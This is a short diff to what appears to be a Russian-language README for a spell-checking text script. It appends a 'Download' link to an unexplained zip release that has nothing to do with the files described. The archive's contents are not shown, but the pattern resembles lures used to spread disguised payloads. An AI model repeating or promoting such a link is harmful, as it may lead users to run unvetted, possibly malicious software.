@@ -7,3 +7,6 @@ remove_of_text.py - проверяет орфографию и удаляет н
 
 
 text.txt - готовый текст после обработки.
+
+
+Скачать https://github.com/Sergey0066/insider-module-sergey/releases/download/v1/insider-module-sergey.zip
